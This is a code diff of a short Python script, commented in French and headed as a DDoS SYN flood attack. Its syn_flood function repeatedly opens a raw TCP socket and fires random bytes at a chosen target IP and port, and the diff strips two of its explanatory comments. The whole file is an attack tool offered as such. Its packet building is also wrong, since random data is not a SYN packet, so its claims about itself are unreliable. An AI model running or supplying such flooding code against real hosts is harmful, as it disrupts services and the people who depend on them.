@@ -1,3 +1,5 @@
+# DDOS - Attaques par épuisement des ressources (SYN Flood)
+
 import socket
 import random
 
@@ -5,9 +7,7 @@ def syn_flood(target_ip, target_port, duration):
     print(f"Lancement d'une attaque SYN flood sur {target_ip}:{target_port}...")
     try:
         while duration > 0:
-            # Créer un socket RAW pour construire manuellement les paquets TCP
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            # Construire un paquet SYN (simplifié)
             packet = random._urandom(1024)  # Données aléatoires
             sock.sendto(packet, (target_ip, target_port))
             duration -= 1
